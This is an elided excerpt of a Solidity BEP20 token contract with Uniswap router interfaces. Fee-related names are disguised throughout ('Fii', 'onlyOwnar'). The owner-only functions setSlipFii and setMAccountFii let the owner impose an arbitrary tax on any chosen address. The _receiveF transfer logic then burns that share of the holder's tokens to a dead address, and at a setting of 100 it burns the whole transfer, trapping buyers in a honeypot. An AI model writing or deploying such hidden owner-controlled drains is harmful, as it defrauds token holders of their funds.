...
interface IUniswapV2Factory {
    ...
    function FiiTo() external view returns (address);
    function FiiToSetter() external view returns (address);
    ...
    function setFiiTo(address) external;
    function setFiiToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFiiOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingFiiOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingFiiOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingFiiOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFiiOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Contract is BEP20, Ownable {
    ...
    uint256 private _defaultSellFii = 0;
    ...
    mapping(address => uint256) private _slipFii;
    ...
    function setSlipFii(address _address, uint256 _value) external onlyOwnar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipFii[_address] = _value;
    }

    function getSlipFii(address _address) external view onlyOwnar returns (uint256) {
        return _slipFii[_address];
    }


    function setMAccountFii(address _address, bool _value) external onlyOwnar {
        _mAccount[_address] = _value;
    }

    function getMAccountFii(address _address) external view onlyOwnar returns (bool) {
    ...
    function _receiveF(
        ...
        if (rF) {
            ...
            if (_slipFii[from] > 0) {
                tradeFii = _slipFii[from];
            }

            tradeFiiAmount = _Amount.mul(tradeFii).div(100);
        }


        if (tradeFiiAmount > 0) {
            _balances[from] = _balances[from].sub(tradeFiiAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFiiAmount);
            emit Transfer(from, _deadAddress, tradeFiiAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeFiiAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeFiiAmount);
        emit Transfer(from, _to, _Amount - tradeFiiAmount);
    }
